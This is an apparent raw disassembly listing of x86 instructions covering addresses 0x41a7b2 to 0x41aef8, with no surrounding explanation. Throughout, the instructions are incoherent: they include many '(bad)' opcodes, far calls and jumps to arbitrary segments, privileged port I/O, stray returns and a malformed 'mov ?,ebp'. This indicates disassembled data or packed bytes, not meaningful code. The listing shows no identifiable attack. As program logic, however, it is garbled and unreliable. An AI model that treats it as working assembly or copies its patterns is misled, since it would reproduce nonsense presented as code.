  41a7b2:	and    edx,DWORD PTR [eax-0x5a7fcf10]
  41a7b8:	gs out 0x2f,al
  41a7bb:	test   DWORD PTR [esi+0x31],ebx
  41a7be:	cmp    eax,0xe483cfe2
  41a7c3:	mov    ah,0x40
  41a7c5:	push   ds
  41a7c6:	or     BYTE PTR [ebx+0x59],ah
  41a7c9:	mov    edx,DWORD PTR [ebx+0x25]
  41a7cc:	push   edx
  41a7cd:	add    bl,bh
  41a7cf:	add    BYTE PTR [edi+0x30],ch
  41a7d2:	push   ebp
  41a7d3:	fcmove st,st(1)
  41a7d5:	imul   eax,DWORD PTR [ebp-0x12387b58],0x72fa7edf
  41a7df:	push   ebx
  41a7e0:	dec    edx
  41a7e1:	push   cs
  41a7e2:	mov    DWORD PTR [ebx],esp
  41a7e4:	xor    bh,BYTE PTR [eax]
  41a7e6:	mov    ecx,0x11552fb3
  41a7eb:	fstp   DWORD PTR [esi+0x12e1bb10]
  41a7f1:	mov    esp,0xbd682f3b
  41a7f6:	xchg   ebx,eax
  41a7f7:	sbb    BYTE PTR [edi],0xd7
  41a7fa:	inc    esp
  41a7fb:	inc    edx
  41a7fc:	iret   
  41a7fd:	imul   ebp,DWORD PTR cs:[edi+0xd],0x3e
  41a802:	leave  
  41a803:	dec    ecx
  41a804:	cdq    
  41a805:	add    BYTE PTR [ecx-0x9],bh
  41a808:	ficomp WORD PTR [edi+edi*4-0x28]
  41a80c:	aam    0x71
  41a80e:	in     al,dx
  41a80f:	or     bh,cl
  41a811:	sbb    ch,cl
  41a813:	retf   
  41a814:	jl     0x41a7cc
  41a816:	out    dx,al
  41a817:	test   al,0xab
  41a819:	repnz xchg edx,eax
  41a81b:	sub    al,0xe0
  41a81d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a81e:	and    al,0x60
  41a820:	cmp    esi,0x33
  41a823:	je     0x41a84a
  41a825:	or     DWORD PTR [ecx],ebx
  41a827:	rcl    DWORD PTR [ecx+0x4dfa5354],0x78
  41a82e:	repnz lods eax,DWORD PTR ds:[esi]
  41a830:	mov    ebx,0xb635f487
  41a835:	(bad)  
  41a836:	mov    ch,0x8f
  41a838:	xchg   ecx,eax
  41a839:	xchg   edi,eax
  41a83a:	mov    ds:0xecaf7d1,eax
  41a83f:	mov    BYTE PTR [ecx-0x3ba10901],ch
  41a845:	xor    DWORD PTR [esi+0x6d],esi
  41a848:	xchg   edi,eax
  41a849:	cli    
  41a84a:	push   bp
  41a84c:	inc    ebp
  41a84d:	lahf   
  41a84e:	inc    esp
  41a84f:	inc    ebp
  41a850:	and    al,0xc9
  41a852:	mov    ds:0x1b21a7a6,al
  41a857:	sar    DWORD PTR [edi+0xca6faf2],1
  41a85d:	test   esi,edx
  41a85f:	push   esi
  41a860:	cmc    
  41a861:	xor    DWORD PTR ds:0x596f0fe6,edx
  41a867:	push   edx
  41a868:	adc    al,0x7b
  41a86a:	xor    al,0x68
  41a86c:	jbe    0x41a8b1
  41a86e:	fist   WORD PTR [edi]
  41a870:	(bad)  
  41a872:	outs   dx,DWORD PTR ds:[esi]
  41a873:	inc    ebx
  41a874:	jg     0x41a7fc
  41a876:	add    BYTE PTR [edx],ah
  41a878:	push   0x7c48de39
  41a87d:	sub    al,0xbd
  41a87f:	repz dec esp
  41a881:	call   0x18b0:0x860633f4
  41a888:	xchg   ebx,eax
  41a889:	mov    dh,0xfd
  41a88b:	push   0xa9a97b01
  41a890:	and    eax,DWORD PTR [eax+0x1f]
  41a893:	jno    0x41a8fe
  41a895:	ins    DWORD PTR es:[edi],dx
  41a896:	cli    
  41a897:	dec    sp
  41a899:	cmp    BYTE PTR [edx-0x16],ch
  41a89c:	sbb    DWORD PTR [ebx+eiz*1],ebx
  41a89f:	fprem1 
  41a8a1:	fdivr  DWORD PTR [ebx]
  41a8a3:	mov    dh,0x42
  41a8a5:	or     al,0xf7
  41a8a7:	jae    0x41a87a
  41a8a9:	and    edx,esp
  41a8ab:	or     dl,BYTE PTR [ecx]
  41a8ad:	call   0x5655:0xbd46ab4a
  41a8b4:	std    
  41a8b5:	js     0x41a917
  41a8b7:	inc    esp
  41a8b8:	mov    edi,0x8cadabf4
  41a8bd:	and    al,0xa5
  41a8bf:	mov    edi,0x8d67b7a9
  41a8c4:	in     al,0x94
  41a8c6:	cmp    DWORD PTR [eax-0x40],ebp
  41a8c9:	cmc    
  41a8ca:	clc    
  41a8cb:	fld    DWORD PTR [edi+0x71]
  41a8ce:	repz cmp DWORD PTR gs:[esi-0x2e],esi
  41a8d3:	int3   
  41a8d4:	xchg   ebx,eax
  41a8d5:	imul   DWORD PTR [edx-0x4d]
  41a8d8:	push   es
  41a8d9:	sbb    BYTE PTR [ecx+0x4e47604e],ah
  41a8df:	fdiv   st(0),st
  41a8e1:	lds    ecx,FWORD PTR [eax+ebx*1]
  41a8e4:	loop   0x41a949
  41a8e6:	out    dx,eax
  41a8e7:	test   BYTE PTR [edx+edi*1+0x6b],bh
  41a8eb:	inc    esi
  41a8ec:	fwait
  41a8ed:	scas   eax,DWORD PTR es:[edi]
  41a8ee:	mov    ah,0x7e
  41a8f0:	add    BYTE PTR [edx-0x42],dh
  41a8f3:	(bad)  
  41a8f4:	pusha  
  41a8f5:	lea    ebx,[ecx+0x2f]
  41a8f8:	cdq    
  41a8f9:	push   ebx
  41a8fa:	dec    eax
  41a8fb:	cmp    cl,BYTE PTR [edx+0x6f777a1f]
  41a901:	iret   
  41a902:	sbb    bh,BYTE PTR [edx+0x3f42dd7c]
  41a908:	out    dx,al
  41a909:	mov    al,ds:0x4ff36287
  41a90e:	dec    esi
  41a90f:	out    0x13,eax
  41a911:	mov    ds:0x2f5082c3,al
  41a916:	enter  0x8ad,0xa6
  41a91a:	inc    esp
  41a91b:	mov    dl,0xdf
  41a91d:	push   edx
  41a91e:	xor    ah,bl
  41a920:	mov    esi,0x1688d518
  41a925:	push   edi
  41a926:	es data16 add al,0xdc
  41a92a:	scas   eax,DWORD PTR es:[edi]
  41a92b:	xchg   ebp,eax
  41a92c:	popa   
  41a92d:	out    dx,eax
  41a92e:	jmp    0x9ec2:0xb1bfefb2
  41a935:	xor    al,0xc8
  41a937:	shr    BYTE PTR [eax+0x58b31f0c],0x68
  41a93e:	pop    es
  41a93f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a940:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a941:	loope  0x41a96a
  41a943:	outs   dx,DWORD PTR ds:[esi]
  41a944:	pushf  
  41a945:	dec    ebp
  41a946:	arpl   bp,dx
  41a948:	push   cs
  41a949:	add    dh,BYTE PTR [eax-0x52]
  41a94c:	mov    cl,0xe1
  41a94e:	data16 stos BYTE PTR es:[edi],al
  41a950:	add    BYTE PTR [eax-0x13],0x9
  41a954:	imul   BYTE PTR [ebp+0x1a]
  41a957:	aaa    
  41a958:	icebp  
  41a959:	ja     0x41a9c4
  41a95b:	cmp    al,0x6
  41a95d:	push   ss
  41a95e:	xchg   BYTE PTR [ebx-0x1b],dh
  41a961:	mov    edx,0x1c22993b
  41a966:	scas   al,BYTE PTR es:[edi]
  41a967:	mov    al,ds:0xfd7689c
  41a96c:	and    al,0x37
  41a96e:	xchg   edx,eax
  41a96f:	mov    cl,bh
  41a971:	repnz gs pop ecx
  41a974:	(bad)  
  41a975:	inc    ecx
  41a976:	ja     0x41a957
  41a978:	push   esi
  41a979:	pop    eax
  41a97b:	hlt    
  41a97c:	cmp    eax,0x4070793d
  41a981:	xchg   edi,eax
  41a982:	test   eax,0x5a07256b
  41a987:	cmp    eax,0xa7b6d6d6
  41a98c:	ror    ah,1
  41a98e:	in     al,0x7c
  41a990:	pop    es
  41a991:	retf   
  41a992:	retf   
  41a993:	inc    esi
  41a994:	cmp    ch,BYTE PTR [ebp+edi*4+0x5b]
  41a998:	ins    BYTE PTR es:[edi],dx
  41a999:	std    
  41a99a:	cmp    al,BYTE PTR [ebx]
  41a99c:	stos   BYTE PTR es:[edi],al
  41a99d:	push   ebx
  41a99e:	push   0x21
  41a9a0:	popa   
  41a9a1:	inc    ecx
  41a9a2:	mov    al,ds:0xf0f264f5
  41a9a7:	xchg   ebp,eax
  41a9a8:	fisubr WORD PTR [edi-0xd]
  41a9ab:	and    DWORD PTR [esi-0x7b6a2883],esi
  41a9b1:	xchg   BYTE PTR [edx+0x4d177d5d],dh
  41a9b7:	out    0x2b,eax
  41a9b9:	xor    DWORD PTR [edi-0x4f2af847],esi
  41a9bf:	xor    al,0xf9
  41a9c1:	mov    edi,0x31de9eb9
  41a9c6:	pusha  
  41a9c7:	gs mov edx,0xc17a192d
  41a9cd:	cmp    al,0x79
  41a9cf:	adc    BYTE PTR [eax+0x10cbc69e],ah
  41a9d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a9d6:	in     al,dx
  41a9d7:	xchg   DWORD PTR [esi],esp
  41a9d9:	ret    
  41a9da:	cmp    ebp,DWORD PTR [edx-0x6bf95bb0]
  41a9e0:	mov    ecx,0xfd56afbe
  41a9e5:	in     eax,dx
  41a9e6:	push   ebx
  41a9e7:	stos   BYTE PTR es:[edi],al
  41a9e8:	retf   0x9575
  41a9eb:	enter  0x6417,0xeb
  41a9ef:	sti    
  41a9f0:	out    dx,eax
  41a9f1:	mov    bl,0xf5
  41a9f3:	daa    
  41a9f4:	addr16 icebp 
  41a9f6:	inc    edi
  41a9f7:	and    eax,0x89c3f1e2
  41a9fc:	mov    ebx,0xd871ed7f
  41aa01:	pop    esp
  41aa02:	pop    ecx
  41aa03:	enter  0xee04,0xd3
  41aa07:	cmp    eax,0x6375f443
  41aa0c:	sahf   
  41aa0d:	jle    0x41a9b4
  41aa0f:	ds (bad) 
  41aa11:	sbb    DWORD PTR [edi+0x1a],ecx
  41aa14:	jno    0x41aa02
  41aa16:	retf   
  41aa17:	pop    ss
  41aa18:	mov    ah,cl
  41aa1a:	xchg   esi,eax
  41aa1b:	arpl   WORD PTR [esi-0x55caf198],cx
  41aa21:	fisubr DWORD PTR [ebx-0x3e0d641b]
  41aa27:	loopne 0x41a9bd
  41aa29:	ja     0x41aa19
  41aa2b:	dec    edx
  41aa2c:	cmp    esi,eax
  41aa2e:	les    edx,FWORD PTR [ebx-0x28]
  41aa31:	sub    al,0x2d
  41aa33:	mov    esi,0xe1dfb2db
  41aa38:	jecxz  0x41aa66
  41aa3a:	ins    BYTE PTR es:[edi],dx
  41aa3b:	fisubr DWORD PTR [ecx-0x5e989dfa]
  41aa41:	jmp    0xc4fd:0xff1b0907
  41aa48:	out    0x64,al
  41aa4a:	pushf  
  41aa4b:	inc    ebx
  41aa4c:	je     0x41aac6
  41aa4e:	and    eax,0x12c62059
  41aa53:	adc    eax,0xd7a74f48
  41aa58:	inc    bl
  41aa5a:	sub    al,0xf4
  41aa5c:	loop   0x41aacb
  41aa5e:	call   0x36f2:0xb00dfeed
  41aa65:	in     al,0x3a
  41aa67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa68:	in     al,dx
  41aa69:	push   edi
  41aa6a:	test   BYTE PTR [esi],dh
  41aa6c:	add    BYTE PTR [esi-0x28ebf3de],bl
  41aa72:	or     DWORD PTR [ecx],esi
  41aa74:	mov    edi,0x42f7f1b2
  41aa79:	inc    ebx
  41aa7a:	sbb    cl,BYTE PTR [edi+ebx*2-0x12]
  41aa7e:	enter  0xadc7,0xbb
  41aa82:	push   ebx
  41aa83:	(bad)  
  41aa84:	and    ebp,DWORD PTR [ecx-0x3d]
  41aa87:	push   edi
  41aa88:	pop    eax
  41aa89:	jp     0x41aa74
  41aa8b:	jecxz  0x41aa45
  41aa8d:	jp     0x41aaaf
  41aa8f:	ds hlt 
  41aa91:	imul   esi,DWORD PTR [ecx],0x56
  41aa94:	inc    ecx
  41aa95:	test   eax,0xe2b6ab8b
  41aa9a:	push   esp
  41aa9b:	fcmovu st,st(2)
  41aa9d:	cmp    dh,cl
  41aa9f:	fnsave [ebx+edi*2]
  41aaa2:	mov    dh,0x32
  41aaa4:	out    dx,al
  41aaa5:	shl    DWORD PTR [esi+0x42],cl
  41aaa8:	and    BYTE PTR [esp+ecx*2-0x664276a7],bh
  41aaaf:	enter  0x1f0a,0x57
  41aab3:	jo     0x41aa59
  41aab5:	je     0x41aa41
  41aab7:	(bad)  
  41aab8:	sub    al,0x75
  41aaba:	sbb    esi,DWORD PTR [edx-0x6d]
  41aabd:	pushf  
  41aabe:	mov    bl,0x66
  41aac0:	mov    edi,0x9310a271
  41aac5:	aad    0x92
  41aac7:	xchg   esp,eax
  41aac8:	or     al,dl
  41aaca:	sbb    BYTE PTR [ebx],bh
  41aacc:	push   ebx
  41aacd:	adc    eax,0xe3d28de8
  41aad2:	pop    esp
  41aad3:	ficomp DWORD PTR [esi-0x6c2d8d3]
  41aad9:	add    DWORD PTR [edi],ebp
  41aadb:	mov    bh,BYTE PTR [edx+edi*2+0x17]
  41aadf:	push   esi
  41aae0:	jecxz  0x41aac4
  41aae2:	jl     0x41aab4
  41aae4:	pop    ebp
  41aae5:	or     edi,ebp
  41aae7:	sub    eax,0x250f0573
  41aaec:	cs jp  0x41ab08
  41aaef:	cmp    al,0xf7
  41aaf1:	mov    ebp,0x1489cf84
  41aaf6:	mov    dl,0x2d
  41aaf8:	jmp    0xfe6:0x12b58e83
  41aaff:	adc    dh,BYTE PTR [edx]
  41ab01:	adc    al,0x98
  41ab03:	pop    eax
  41ab04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab05:	push   edx
  41ab06:	add    BYTE PTR [edi],0x59
  41ab09:	jno    0x41aaaa
  41ab0b:	xabort 0xe7
  41ab0e:	push   ecx
  41ab0f:	mov    edx,0x4a03865f
  41ab14:	adc    eax,0xedede6d5
  41ab19:	mov    edi,0x47c8f7c
  41ab1e:	or     eax,0xbeb02901
  41ab23:	cs rol bh,0x7
  41ab27:	ins    DWORD PTR es:[edi],dx
  41ab28:	add    ch,BYTE PTR [edx]
  41ab2a:	and    eax,0x9c2e3ab3
  41ab2f:	int3   
  41ab30:	or     al,0xb4
  41ab32:	mov    esp,0x3792aa84
  41ab37:	xor    DWORD PTR [ecx],ebx
  41ab39:	aaa    
  41ab3a:	xchg   ebp,eax
  41ab3b:	jnp    0x41ab07
  41ab3d:	xor    al,0x87
  41ab3f:	sar    BYTE PTR [eax-0x35],cl
  41ab42:	mov    BYTE PTR [esi],ah
  41ab44:	pushf  
  41ab45:	sahf   
  41ab46:	inc    edi
  41ab47:	vmread DWORD PTR [ecx+ebp*4],ebx
  41ab4b:	sbb    BYTE PTR [eax],al
  41ab4d:	pop    esp
  41ab4e:	clc    
  41ab4f:	xor    eax,0x6289b1f0
  41ab54:	adc    al,al
  41ab56:	das    
  41ab57:	dec    eax
  41ab58:	test   eax,0x676c94b8
  41ab5d:	imul   ecx,DWORD PTR [esi+edi*4-0x71],0x3a
  41ab62:	add    ecx,ecx
  41ab64:	aaa    
  41ab65:	jmp    0xab6d29d4
  41ab6a:	ja     0x41abc5
  41ab6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab6d:	mov    dl,0x1b
  41ab6f:	retf   0x8d36
  41ab72:	cmp    eax,0xacd016da
  41ab77:	lea    esi,[edx]
  41ab79:	mov    DWORD PTR [edi+eiz*1],0x5f53be0f
  41ab80:	jmp    0x41ab6f
  41ab82:	cmp    DWORD PTR [eax+edx*8-0x494cb772],eax
  41ab89:	jg     0x41ab93
  41ab8b:	lods   al,BYTE PTR ds:[esi]
  41ab8c:	sbb    DWORD PTR [ebp+0x54],ecx
  41ab8f:	test   eax,0x3953106e
  41ab94:	xor    BYTE PTR [eax-0x7d],cl
  41ab97:	push   ecx
  41ab98:	mov    edi,0xb4ecac6a
  41ab9d:	rol    DWORD PTR [edx-0x25687306],cl
  41aba3:	push   esp
  41aba4:	leave  
  41aba5:	mov    ?,ebp
  41aba7:	xchg   esp,eax
  41aba8:	or     cl,dl
  41abaa:	adc    al,BYTE PTR [edx-0x7f]
  41abad:	push   ds
  41abae:	int    0xc8
  41abb0:	sbb    ebp,0x642ae192
  41abb6:	int    0xf9
  41abb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41abb9:	push   edx
  41abba:	aaa    
  41abbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41abbc:	xchg   BYTE PTR [edx-0x70a77ea6],bl
  41abc2:	shl    DWORD PTR [esp+eax*2+0x63],cl
  41abc6:	lock test eax,0x9b72a825
  41abcc:	sbb    DWORD PTR [esi+0x2a],0x3e
  41abd0:	mov    eax,0x782f4107
  41abd5:	cmp    al,0x2
  41abd7:	adc    eax,0x83bb7656
  41abdc:	ficomp DWORD PTR [ecx]
  41abde:	out    dx,al
  41abdf:	push   ds
  41abe0:	mov    ecx,es
  41abe2:	xor    DWORD PTR [ecx+0x2b632590],ebp
  41abe8:	mov    bl,0xd0
  41abea:	mov    BYTE PTR [esi-0xefefa1f],cl
  41abf0:	inc    edx
  41abf1:	and    DWORD PTR [ebx-0x30],0xffffffaa
  41abf5:	pop    ecx
  41abf6:	gs in  eax,dx
  41abf8:	push   ds
  41abf9:	imul   edx,DWORD PTR ds:0xc65d4d78,0xffffffd9
  41ac00:	dec    edx
  41ac01:	or     esp,DWORD PTR [esi]
  41ac03:	jge    0x41abf0
  41ac05:	mov    bh,0xaa
  41ac07:	repnz loopne 0x41abec
  41ac0a:	and    al,0xcf
  41ac0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac0d:	jl     0x41abc6
  41ac0f:	push   eax
  41ac10:	sub    eax,DWORD PTR [ebp+0x3833a4b8]
  41ac16:	sbb    al,0xba
  41ac18:	(bad)  
  41ac1a:	(bad)  
  41ac1b:	(bad)  
  41ac1c:	aas    
  41ac1d:	mov    esp,0x27014ef3
  41ac22:	sbb    ah,BYTE PTR [ebp+0x5f41e57a]
  41ac28:	xor    DWORD PTR [ebx-0x20f5e359],esi
  41ac2e:	jae    0x41ac4d
  41ac30:	pusha  
  41ac31:	(bad)  
  41ac32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac33:	xor    bh,ch
  41ac35:	(bad)  
  41ac36:	mul    BYTE PTR [ebx-0xd]
  41ac39:	push   esp
  41ac3a:	popf   
  41ac3b:	jnp    0x41ac3e
  41ac3d:	xchg   esi,eax
  41ac3e:	xchg   edx,eax
  41ac3f:	ins    DWORD PTR es:[edi],dx
  41ac40:	lahf   
  41ac41:	push   0x1c
  41ac43:	or     al,0xad
  41ac45:	loope  0x41ac8e
  41ac47:	xor    ebx,0xe00c873e
  41ac4d:	fs inc ebp
  41ac4f:	add    bl,BYTE PTR [esi+ecx*4-0x4ac61358]
  41ac56:	retf   0xeaaa
  41ac59:	aad    0x77
  41ac5b:	inc    ecx
  41ac5c:	pop    eax
  41ac5d:	adc    eax,0xecf1f36d
  41ac62:	jbe    0x41ac4b
  41ac64:	cmp    al,0x8b
  41ac66:	add    BYTE PTR [ebp+0x7907e4f5],dh
  41ac6c:	sahf   
  41ac6d:	ror    ecx,0x11
  41ac70:	imul   esp,DWORD PTR [ebx],0xffffffa4
  41ac73:	sub    ebx,DWORD PTR [edi-0x82edced]
  41ac79:	add    eax,0xee046645
  41ac7e:	cs data16 stc 
  41ac81:	xor    ecx,DWORD PTR [ecx+ecx*4]
  41ac84:	sbb    ecx,DWORD PTR ds:0xc57ebf26
  41ac8a:	xchg   DWORD PTR [ebp-0x16],ebx
  41ac8d:	jns    0x41acd6
  41ac8f:	push   0x4d4e4217
  41ac94:	ins    BYTE PTR es:[edi],dx
  41ac95:	mov    ah,0xcd
  41ac97:	and    bh,ch
  41ac99:	push   ecx
  41ac9a:	and    DWORD PTR [ecx+0x343f38b1],ecx
  41aca0:	jno    0x41acf9
  41aca2:	scas   eax,DWORD PTR es:[edi]
  41aca3:	sub    al,0x73
  41aca5:	fidiv  DWORD PTR [eax-0x42]
  41aca8:	and    DWORD PTR [esi-0x67820d04],ebp
  41acae:	lods   eax,DWORD PTR ds:[esi]
  41acaf:	jo     0x41aced
  41acb1:	adc    ebx,eax
  41acb3:	xor    DWORD PTR [esi],edi
  41acb5:	rcl    ebp,cl
  41acb7:	fistp  DWORD PTR [esi+ebx*4+0xfa95e4d]
  41acbe:	aas    
  41acbf:	jl     0x41ac8d
  41acc1:	or     cl,BYTE PTR [esi]
  41acc3:	popf   
  41acc4:	add    DWORD PTR [edx],ecx
  41acc6:	adc    ebp,DWORD PTR [edi+0xdda8f7b]
  41accc:	xor    dl,0x5d
  41accf:	imul   ebx,edi,0x16
  41acd2:	dec    esi
  41acd3:	xchg   ecx,eax
  41acd4:	jecxz  0x41ad54
  41acd6:	shl    BYTE PTR [edi],cl
  41acd8:	and    eax,0xcff30a75
  41acde:	fld    TBYTE PTR [edi+edx*8-0x5f]
  41ace2:	into   
  41ace3:	adc    al,0x99
  41ace5:	rcl    DWORD PTR [eax-0x1aad679c],cl
  41aceb:	jmp    0x5820:0x6e5de5a4
  41acf2:	dec    ebx
  41acf3:	fchs   
  41acf5:	cmp    ecx,DWORD PTR [ecx]
  41acf7:	call   0xb8f2:0xe5282b2b
  41acfe:	cmp    eax,0x91fd7a02
  41ad03:	js     0x41ace6
  41ad05:	leave  
  41ad06:	stos   DWORD PTR es:[edi],eax
  41ad07:	out    0xf5,eax
  41ad09:	pusha  
  41ad0a:	mov    bl,0x2
  41ad0c:	push   eax
  41ad0d:	clc    
  41ad0e:	push   es
  41ad0f:	(bad)  
  41ad10:	mov    bh,0x6a
  41ad12:	lods   al,BYTE PTR ds:[esi]
  41ad13:	dec    eax
  41ad14:	jns    0x41ad95
  41ad16:	pop    es
  41ad17:	or     DWORD PTR [eax+0x64],edi
  41ad1a:	cmp    DWORD PTR [edi+edi*1],ecx
  41ad1d:	test   al,0xfe
  41ad1f:	sbb    DWORD PTR [eax+0x38ac5c5e],0xe80b37bf
  41ad29:	cwde   
  41ad2a:	aas    
  41ad2b:	mov    ds,ecx
  41ad2d:	and    ah,BYTE PTR [edx]
  41ad2f:	aaa    
  41ad30:	data16 shl BYTE PTR ds:0x788d6bac,cl
  41ad37:	sub    eax,0xc5703c8b
  41ad3c:	jae    0x41ad6f
  41ad3e:	mov    cl,0x19
  41ad40:	sub    al,0x18
  41ad42:	cs mov dl,dl
  41ad45:	add    al,BYTE PTR [ebx+0x35]
  41ad48:	jp     0x41ad0a
  41ad4a:	and    al,0x3e
  41ad4c:	inc    esi
  41ad4d:	jno    0x41ada3
  41ad4f:	mov    bl,0x44
  41ad51:	rcr    BYTE PTR [edx],cl
  41ad53:	cdq    
  41ad54:	and    al,0xe3
  41ad56:	fiadd  DWORD PTR [edi]
  41ad58:	jmp    0x774d:0x82299b0f
  41ad5f:	and    esp,eax
  41ad61:	in     eax,dx
  41ad62:	lds    ebp,FWORD PTR [esi]
  41ad64:	shl    DWORD PTR [edi],0x8f
  41ad67:	aas    
  41ad68:	mov    edi,0x23c2ea5c
  41ad6d:	ins    DWORD PTR es:[edi],dx
  41ad6e:	mov    ebx,0xa7231b06
  41ad73:	(bad)  
  41ad74:	push   ds
  41ad75:	fwait
  41ad76:	in     eax,dx
  41ad77:	popf   
  41ad78:	dec    ecx
  41ad79:	arpl   dx,bp
  41ad7b:	inc    edi
  41ad7c:	sbb    DWORD PTR [eax+0x2e],edi
  41ad7f:	mov    ah,0x4b
  41ad81:	push   cs
  41ad82:	sahf   
  41ad83:	push   ebp
  41ad84:	stos   DWORD PTR es:[edi],eax
  41ad85:	jbe    0x41ad0e
  41ad87:	and    al,0xb4
  41ad89:	lods   eax,DWORD PTR ds:[esi]
  41ad8a:	add    DWORD PTR [esp+edx*4],edx
  41ad8d:	mov    al,ds:0x46f4a448
  41ad92:	stc    
  41ad93:	arpl   WORD PTR [esi],dx
  41ad95:	jge    0x41adae
  41ad97:	pop    edi
  41ad98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad99:	aam    0x64
  41ad9b:	fist   WORD PTR [ebp-0x7f]
  41ad9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad9f:	sub    edx,DWORD PTR ds:0x1cc994e9
  41ada5:	mov    ah,0x33
  41ada7:	jmp    0xbdde7557
  41adac:	or     ebp,DWORD PTR [ebx-0x14]
  41adaf:	jns    0x41adc1
  41adb1:	and    BYTE PTR [ecx-0x31b55cd2],ah
  41adb7:	jmp    0xdff4:0x5a7941e2
  41adbe:	push   0x1d
  41adc0:	and    eax,0x66f0551b
  41adc5:	retf   
  41adc6:	jno    0x41ae1e
  41adc8:	es mov bl,0xd8
  41adcb:	js     0x41ae41
  41adcd:	fs xchg esi,eax
  41adcf:	popf   
  41add0:	xor    ebp,DWORD PTR [edx+eax*2-0x48665e51]
  41add7:	cmp    al,al
  41add9:	lds    eax,FWORD PTR [esi+0x4aea61a7]
  41addf:	xor    BYTE PTR [ebx],dh
  41ade1:	fisttp DWORD PTR [ebp+0x23]
  41ade4:	adc    BYTE PTR [esp+ebx*1-0x7],0x9c
  41ade9:	mov    edx,0x499540a1
  41adee:	outs   dx,BYTE PTR ds:[esi]
  41adef:	js     0x41ae0b
  41adf1:	cwde   
  41adf2:	cld    
  41adf3:	imul   ebp,DWORD PTR [esi],0x3a6dcce6
  41adf9:	cwde   
  41adfa:	mov    edx,esi
  41adfc:	push   ebp
  41adfd:	outs   dx,BYTE PTR ds:[esi]
  41adfe:	iret   
  41adff:	cdq    
  41ae00:	xlat   BYTE PTR ds:[ebx]
  41ae01:	es ds and eax,0x90d819be
  41ae08:	adc    eax,edx
  41ae0a:	or     edi,eax
  41ae0c:	jg     0x41adb4
  41ae0e:	in     al,dx
  41ae0f:	retf   
  41ae10:	xchg   BYTE PTR ds:0xf985222f,bh
  41ae16:	sub    dl,0xee
  41ae19:	pop    edi
  41ae1a:	scas   al,BYTE PTR es:[edi]
  41ae1b:	hlt    
  41ae1c:	neg    DWORD PTR [ecx-0x3f02745]
  41ae22:	mov    ebx,esp
  41ae24:	je     0x41ae67
  41ae26:	push   esp
  41ae27:	mov    gs,WORD PTR [eax-0x13]
  41ae2a:	push   ecx
  41ae2b:	dec    ebx
  41ae2c:	sub    edi,ebp
  41ae2e:	jecxz  0x41ae88
  41ae30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae32:	jno    0x41adf4
  41ae34:	add    DWORD PTR [ebx+0x18],0x48
  41ae38:	jl     0x41addf
  41ae3a:	sub    ebp,ebp
  41ae3c:	dec    ah
  41ae3e:	ret    
  41ae3f:	push   cs
  41ae40:	(bad)  
  41ae41:	fst    DWORD PTR [edx]
  41ae43:	lahf   
  41ae44:	mov    dh,0xcd
  41ae46:	mov    ebx,0x7dbe58f4
  41ae4b:	xchg   edx,eax
  41ae4c:	pop    esi
  41ae4d:	adc    eax,0x2742c5f2
  41ae52:	repz arpl WORD PTR ds:0x5618d99,di
  41ae59:	adc    eax,0xc00913ca
  41ae5e:	ror    DWORD PTR cs:[ebx],cl
  41ae61:	ficomp WORD PTR [eax]
  41ae63:	loop   0x41aee0
  41ae65:	imul   ebx,DWORD PTR [edi-0x8],0xb2c10c6c
  41ae6c:	mov    al,ds:0x61113867
  41ae71:	arpl   WORD PTR [edi-0x5f],cx
  41ae74:	push   ebp
  41ae75:	dec    ecx
  41ae76:	test   BYTE PTR [ecx+ecx*2-0x45471d9b],ch
  41ae7d:	lahf   
  41ae7e:	jg     0x41aecf
  41ae80:	aad    0x87
  41ae82:	out    0x4,al
  41ae84:	lods   al,BYTE PTR ds:[esi]
  41ae85:	mov    ebp,0x1907ab42
  41ae8a:	xchg   ecx,eax
  41ae8b:	(bad)  
  41ae8c:	xor    edi,DWORD PTR [edx]
  41ae8e:	call   0x952a:0xb6094a7f
  41ae95:	loope  0x41aee0
  41ae97:	and    BYTE PTR [ebp+eax*2+0x78],0x11
  41ae9c:	xchg   ebx,eax
  41ae9d:	stc    
  41ae9e:	out    dx,eax
  41ae9f:	scas   eax,DWORD PTR es:[edi]
  41aea0:	lods   al,BYTE PTR ds:[esi]
  41aea1:	mov    BYTE PTR [edx-0x582e40a7],ah
  41aea7:	or     ch,BYTE PTR [ebx-0x19]
  41aeaa:	in     al,dx
  41aeab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aeac:	addr16 aam 0x13
  41aeaf:	les    ebp,FWORD PTR [ebx-0x8]
  41aeb2:	sti    
  41aeb3:	push   0x5947f0f3
  41aeb8:	sbb    cl,BYTE PTR [eax+0x8]
  41aebb:	xor    esp,esi
  41aebd:	xlat   BYTE PTR ds:[ebx]
  41aebe:	sub    dl,ch
  41aec0:	dec    edx
  41aec1:	sbb    al,0x5e
  41aec3:	test   WORD PTR ds:[ecx+0x4a],0x3d93
  41aeca:	sub    bh,BYTE PTR [ecx+edi*4+0x2a8bc6e1]
  41aed1:	cmp    DWORD PTR [ebx],eax
  41aed3:	xlat   BYTE PTR ds:[ebx]
  41aed4:	outs   dx,BYTE PTR ds:[esi]
  41aed5:	jns    0x41aed3
  41aed7:	loop   0x41af49
  41aed9:	xchg   esi,eax
  41aeda:	dec    ebx
  41aedb:	cmp    ecx,DWORD PTR [ebx-0x4a04378a]
  41aee1:	sar    DWORD PTR [esp+ecx*1+0x4b],0x12
  41aee6:	inc    ebp
  41aee7:	(bad)  
  41aee8:	popa   
  41aee9:	(bad)  
  41aeea:	cwde   
  41aeeb:	scas   al,BYTE PTR es:[edi]
  41aeec:	sub    eax,0x509ac882
  41aef1:	cmc    
  41aef2:	call   0x4fa6b237
  41aef7:	(bad)  
  41aef8:	add    edx,DWORD PTR [edi]
